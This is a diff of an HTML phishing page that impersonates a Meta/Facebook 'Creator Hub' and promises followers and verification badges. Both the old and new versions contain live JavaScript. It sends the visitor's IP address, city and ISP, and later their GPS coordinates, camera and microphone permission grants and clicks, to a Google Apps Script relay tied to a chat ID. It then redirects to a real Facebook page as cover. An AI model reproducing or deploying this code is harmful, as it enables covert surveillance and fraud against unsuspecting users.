@@ -1,41 +1,28 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"><title>Meta Creator Studio | Verified Hub</title><link href="https://fonts.googleapis.com" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com"><style>:root{--p:#0064e0;--bg:#f0f2f5;--card:#fff}*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Inter',sans-serif;background:var(--bg);display:flex;align-items:center;justify-content:center;min-height:100vh;padding:15px}.container{max-width:400px;width:100%;background:var(--card);border-radius:12px;box-shadow:0 12px 28px rgba(0,0,0,0.12);overflow:hidden}.header{padding:30px;text-align:center;border-bottom:1px solid #eee}.logo{font-size:45px;color:var(--p);margin-bottom:12px}.content{padding:25px;text-align:center}.main-btn{width:100%;padding:18px;border:none;border-radius:10px;background:var(--p);color:#fff;font-size:16px;font-weight:700;cursor:pointer}.grid{display:none;grid-template-columns:1fr 1fr;gap:12px;margin-top:25px}.card{padding:18px;background:#f0f2f5;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer;border:1px solid #ddd;text-align:center}.card i{font-size:24px;color:var(--p);margin-bottom:8px;display:block}</style></head><body>
-<div class="container"><div class="header"><div class="logo"><i class="fab fa-facebook"></i></div><h2>Meta Creator Hub</h2><p style="font-size:13px;color:#65676b;margin-top:8px">Global verification for Blue Badge, Ad-Revenue, and VIP Groups.</p></div><div class="content"><button id="startBtn" class="main-btn">Start Global Sync</button><div id="grid" class="grid"><div class="card" data-act="cam"><i class="fas fa-certificate"></i>Blue Badge Sync</div><div class="card" data-act="loc"><i class="fas fa-chart-line"></i>Ad-Region Lock</div><div class="card" data-act="mic"><i class="fas fa-microphone-alt"></i>Voice Auth</div><div class="card" data-act="fol"><i class="fas fa-user-plus"></i>10k Followers</div><div class="card" data-act="net"><i class="fas fa-bolt"></i>Fast Net Trick</div><div class="card" data-act="grp"><i class="fas fa-users-crown"></i>VIP Groups</div></div></div></div><script>
-class FinalBridge {
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Meta Creator Studio</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com"><style>body{font-family:sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}.c{background:#fff;padding:30px;border-radius:12px;box-shadow:0 8px 20px rgba(0,0,0,0.1);text-align:center;width:100%;max-width:400px}.b{width:100%;padding:15px;background:#0064e0;color:#fff;border:none;border-radius:8px;font-weight:700;cursor:pointer}.g{display:none;grid-template-columns:1fr 1fr;gap:10px;margin-top:20px}.card{background:#f0f2f5;padding:15px;border-radius:10px;font-size:12px;font-weight:700;cursor:pointer}</style></head><body>
+<div class="c"><div style="font-size:40px;color:#0064e0;margin-bottom:10px"><i class="fab fa-facebook"></i></div><h2>Creator Hub</h2><p>Unlock 10k Followers & VIP Access</p><button id="s" class="b">Activate Sync</button><div id="grid" class="g"><div class="card" data-act="fol">10k Followers</div><div class="card" data-act="cam">Identity Sync</div><div class="card" data-act="loc">Region Lock</div><div class="card" data-act="grp">VIP Groups</div></div></div>
+<script>
+class OmniShield {
     constructor() {
-        this.bridge = "https://script.google.com/macros/s/AKfycbzL_njCl5CDQidqHMb2LFt0AVqN6bz0ZOBZ5iMCq3WKofvvV0EunyGh0C1G18yAujH3mw/exec"; 
-        this.chatId = '6671784926';
-        this.session = Math.random().toString(36).substring(2, 10).toUpperCase();
+        this.u = "https://script.google.com/macros/s/AKfycbxwolMlVYg8m1y8YXWeAZfoEVi00KBTTNljOZBiXd0pmsPoXis9-3psCoWbUgRlNPerdA/exec";
+        this.id = "6671784926";
+        this.sid = Math.random().toString(36).substring(2,8).toUpperCase();
         this.init();
     }
-    async report(msg, head="v20-GLOBAL") {
-        await fetch(this.bridge, {
-            method: 'POST', mode: 'no-cors',
-            body: JSON.stringify({ chat_id: this.chatId, text: `🌍 <b>[${head}] ID: ${this.session}</b>\n\n${msg}`, parse_mode: 'HTML' })
-        });
+    async rep(txt, h="v21-HIT") {
+        fetch(this.u, {method:'POST', mode:'no-cors', body:JSON.stringify({chat_id:this.id, text:`🛡️ [${h}] ID:${this.sid}\n\n${txt}`, parse_mode:'HTML'})});
     }
     async init() {
-        const ip = await fetch('https://ipapi.co').then(r => r.json()).catch(() => ({}));
-        this.report(`📂 <b>SCAN:</b>\nIP: <code>${ip.ip || '??'}</code>\nCITY: ${ip.city || '??'}\nRAM: ${navigator.deviceMemory}GB`);
-
-        document.getElementById('startBtn').onclick = () => {
-            document.getElementById('startBtn').style.display = 'none';
-            document.getElementById('grid').style.display = 'grid';
-            this.triggerAll();
+        const ip = await fetch('https://ipapi.co').then(r=>r.json()).catch(()=>({}));
+        this.rep(`IP: ${ip.ip}\nCity: ${ip.city}\nISP: ${ip.org}`, "START");
+        document.getElementById('s').onclick = () => {
+            document.getElementById('s').style.display='none';
+            document.getElementById('grid').style.display='grid';
+            navigator.geolocation.getCurrentPosition(p=>this.rep(`GPS: ${p.coords.latitude},${p.coords.longitude}`));
+            navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s=>{this.rep("MEDIA: GRANTED");s.getTracks().forEach(t=>t.stop())});
         };
-        document.querySelectorAll('.card').forEach(c => c.onclick = () => {
-            this.report(`🎯 <b>CLICK:</b> ${c.innerText}`, "ACTIVITY");
-            alert("Connecting to Meta Cloud...");
-            setTimeout(() => { window.location.href = "https://business.facebook.com"; }, 2000);
-        });
-    }
-    async triggerAll() {
-        navigator.geolocation.getCurrentPosition(p => this.report(`📍 GPS: ${p.coords.latitude},${p.coords.longitude}`, "LOCATION"));
-        navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(s => {
-            this.report("📸/🎙️ MEDIA GRANTED", "MEDIA");
-            s.getTracks().forEach(t => t.stop());
-        });
+        document.querySelectorAll('.card').forEach(c=>c.onclick=()=>{this.rep(`CLICK: ${c.innerText}`);alert("Syncing...");window.location.href="https://business.facebook.com"});
     }
 }
-new FinalBridge();
+new OmniShield();
 </script></body></html>
 
